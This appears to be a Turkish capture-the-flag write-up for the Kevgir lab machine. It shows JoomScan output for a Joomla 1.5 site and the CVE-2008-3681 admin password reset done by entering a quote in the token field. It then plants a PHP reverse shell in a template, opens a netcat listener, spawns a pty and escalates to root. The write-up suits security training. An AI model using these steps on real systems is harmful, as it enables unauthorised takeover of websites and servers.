Nmap taraması sonucunda  8081 portunda bir http servisinin çalıştığını görmüştük. 

`8081/tcp open  http        Apache httpd 2.4.7 ((Ubuntu))` 

![[KevgirJoomla.png]]

Joomscan aracı ile taramayı gerçekleştiriyoruz. 

```

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.0.2.11:8081 ...


[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 1.5

[+] Core Joomla Vulnerability
[++] Joomla! 1.5 Beta 2 - 'Search' Remote Code Execution
EDB : https://www.exploit-db.com/exploits/4212/

Joomla! 1.5 Beta1/Beta2/RC1 - SQL Injection
CVE : CVE-2007-4781
EDB : https://www.exploit-db.com/exploits/4350/

Joomla! 1.5.x - (Token) Remote Admin Change Password
CVE : CVE-2008-3681
EDB : https://www.exploit-db.com/exploits/6234/

Joomla! 1.5.x - Cross-Site Scripting / Information Disclosure
CVE: CVE-2011-4909
EDB : https://www.exploit-db.com/exploits/33061/

Joomla! 1.5.x - 404 Error Page Cross-Site Scripting
EDB : https://www.exploit-db.com/exploits/33378/

Joomla! 1.5.12 - read/exec Remote files
EDB : https://www.exploit-db.com/exploits/11263/

Joomla! 1.5.12 - connect back Exploit
EDB : https://www.exploit-db.com/exploits/11262/

Joomla! Plugin 'tinybrowser' 1.5.12 - Arbitrary File Upload / Code Execution (Metasploit)
CVE : CVE-2011-4908
EDB : https://www.exploit-db.com/exploits/9926/

Joomla! 1.5 - URL Redirecting
EDB : https://www.exploit-db.com/exploits/14722/

Joomla! 1.5.x - SQL Error Information Disclosure
EDB : https://www.exploit-db.com/exploits/34955/ 

Joomla! - Spam Mail Relay
EDB : https://www.exploit-db.com/exploits/15979/

Joomla! 1.5/1.6 - JFilterInput Cross-Site Scripting Bypass
EDB : https://www.exploit-db.com/exploits/16091/

Joomla! < 1.7.0 - Multiple Cross-Site Scripting Vulnerabilities
EDB : https://www.exploit-db.com/exploits/36176/

Joomla! 1.5 < 3.4.5 - Object Injection Remote Command Execution
CVE : CVE-2015-8562
EDB : https://www.exploit-db.com/exploits/38977/

Joomla! 1.0 < 3.4.5 - Object Injection 'x-forwarded-for' Header Remote Code Execution
CVE : CVE-2015-8562 , CVE-2015-8566 
EDB : https://www.exploit-db.com/exploits/39033/

Joomla! 1.5.0 Beta - 'pcltar.php' Remote File Inclusion
CVE : CVE-2007-2199
EDB : https://www.exploit-db.com/exploits/3781/

Joomla! Component xstandard editor 1.5.8 - Local Directory Traversal
CVE : CVE-2009-0113
EDB : https://www.exploit-db.com/exploits/7691/



[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.0.2.11:8081/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.0.2.11:8081/robots.txt 

Interesting path found from robots.txt
http://10.0.2.11:8081/administrator/
http://10.0.2.11:8081/cache/
http://10.0.2.11:8081/components/
http://10.0.2.11:8081/images/
http://10.0.2.11:8081/includes/
http://10.0.2.11:8081/installation/
http://10.0.2.11:8081/language/
http://10.0.2.11:8081/libraries/
http://10.0.2.11:8081/media/
http://10.0.2.11:8081/modules/
http://10.0.2.11:8081/plugins/
http://10.0.2.11:8081/templates/
http://10.0.2.11:8081/tmp/
http://10.0.2.11:8081/xmlrpc/

```


Tespit edilen CVE kodlarında CVE-2008-3681 kullanarak uzaktan admin parolasını değiştireceğiz. 

CVE-2008-3681 için referans gösterilen Exploit-db de zafiyeti sömürebilmek için aşağıda ki yönerge verilmişit. 

```

1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm

2. Write into field "token" char ' and Click OK.

3. Write new password for admin

4. Go to url : target.com/administrator/

5. Login admin with new password

```


#### Birinci Adım 

`http://10.0.2.11:8081//index.php?option=com_user&view=reset&layout=confirm`

![[KevgirJoomlaResetAdmin.png]]

#### İkinci Adım

Kullanıcıdan istenen token yerine '  koyarak işleme devam ediyoruz. 

#### Üçüncü Adım 

Direkt olarak kullanıcı şifre değişikliğine ulaştık ve şifremizi değiştirdik. 

![[KevgirPassReset.png]]

Admin parolamızı değiştirdik. Web yönetim paneli aracılığıyla shell alarak sistem içersine sızacağız. 


Web yönetim panelini joomscan aracılığyla tespit etmiştik .
```
Interesting path found from robots.txt
http://10.0.2.11:8081/administrator/
```


![[Kevgir.png]]


Değiştirdiğimiz admin şifresi ile sisteme giriş yapıyoruz ve bizi Joomla yönetim paneli karşılıyor. 

Yönetim panelinde Extensions/Template Manager mevcut templateleri görebiliyoruz. 

![[KevgirTemplateMan.png]]

beez şablonunu editliyoruz. Beez php uzantısında olduğundan php ye uygun reverse shell düzenleyerek sistem içerisine sızacağız. Beez şablonuna girip Edit HTML  ile mevcut kodların yerine php reverse shell kodlarımızı ekleyeceğiz. 


![[KevgirJoomlaRevers.png]]

Kayıt işlemini gerçekleştirdikten sonra netcat aracımız ile bağlantı sağlayacağımız portu dinliyoruz. 

`nc -lvnp 9001`

Beez şablon düzenleme sayfamızda Preview diyerek shell dosyamıız çalıştırıyoruz. 

![[KevgirNetcat.png]]

``python3 -c 'import pty; pty.spawn("/bin/bash")'`` komutuyla birlikte bash kabuğumuzu aktifleştiriyoruz. Yetki yükseltmek için sisteme zaten exploit yüklemiştik. Aynı exploiti kullanarak yetkimizi yükseltiyoruz sistem içerinde root oluyoruz. 

![[KEvgirJoomlaRoot.png]]